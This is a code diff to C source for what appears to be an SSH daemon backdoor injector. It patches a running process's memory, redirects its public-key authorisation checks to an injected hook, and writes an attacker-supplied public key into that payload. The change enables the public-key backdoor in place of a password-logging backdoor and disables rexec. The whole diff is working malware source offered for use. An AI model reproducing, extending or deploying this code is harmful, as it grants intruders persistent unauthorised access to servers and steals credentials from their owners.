@@ -18,6 +18,9 @@
 extern unsigned char hook_passlog_bin[];
 extern int hook_passlog_bin_len;
 
+extern unsigned char hook_pubkey_bin[];
+extern int hook_pubkey_bin_len;
+
 u8 *dynsym, *dynstr;
 u64 dynsym_base, dynstr_base;
 int dynsym_sz, dynstr_sz;
@@ -71,7 +74,6 @@ u64 find_hole(inject_ctx *ctx, u64 call, u32 size) {
 	return hole_addr;
 }
 
-/*
 void pubkey_backdoor(inject_ctx *ctx, char *pubkey) {
 	signature signatures[]={
 		{ 0x7777777788888888, "key_allowed", "trying public key file %s", 0 },
@@ -90,8 +92,8 @@ void pubkey_backdoor(inject_ctx *ctx, char *pubkey) {
 	u64 user_key_allowed2_calls[MAX_KEY_ALLOWED_CALLS];
 	u64 diff=0, hole_addr=0;
 
-	evil_bin = malloc(evil_hook_size);
-	memcpy(evil_bin, evil_hook, evil_hook_size);
+	evil_bin = malloc(hook_pubkey_bin_len);
+	memcpy(evil_bin, hook_pubkey_bin, hook_pubkey_bin_len);
 
 	for(i = 0; i < sizeof(signatures) / sizeof(signature); i++) {
 		signatures[i].addr = sub_by_debugstr(ctx, signatures[i].str);
@@ -104,7 +106,7 @@ void pubkey_backdoor(inject_ctx *ctx, char *pubkey) {
 			signatures[i].name, signatures[i].addr
 		);
 
-		for(j = 0; j < evil_hook_size - 8; j++) {
+		for(j = 0; j < hook_pubkey_bin_len - 8; j++) {
 			u64 *vptr = (u64*)&evil_bin[j];
 			if (*vptr == signatures[i].placeholder) {
 				sprintf(
@@ -164,12 +166,19 @@ void pubkey_backdoor(inject_ctx *ctx, char *pubkey) {
 		_poke(ctx->pid, user_key_allowed2_calls[i]+1, &diff, 4);
 	}
 
-	_poke(ctx->pid, hole_addr, evil_bin, evil_hook_size);
-	_poke(ctx->pid, hole_addr+(evil_hook_size), pubkey, strlen(pubkey));
+	_poke(ctx->pid, hole_addr, evil_bin, hook_pubkey_bin_len);
+
+	for(i=0; i<hook_pubkey_bin_len; i++) {
+		if (memcmp(evil_bin+i, "\xaa\xbb\xcc\xdd", 4) == 0) {
+			info("inserting pubkey at offset %x in payload", i);
+			_poke(ctx->pid, hole_addr+i, pubkey, strlen(pubkey));
+		}
+	}
+
 	info("poked evil_bin to 0x%lx.", hole_addr);
 	
 }
-*/
+
 
 void password_backdoor(inject_ctx *ctx) {
 	u8 privsep_jnz[2]={0,0};
@@ -392,8 +401,8 @@ int main(int argc, char *argv[]) {
 
 	cache_calltable(ctx);
 
-	password_backdoor(ctx);
-	//pubkey_backdoor(ctx, argv[2]);
+	//password_backdoor(ctx);
+	pubkey_backdoor(ctx, argv[2]);
 
 	info("switching off rexec..");
 	_poke(ctx->pid, rexec_flag, &nullw, 4);
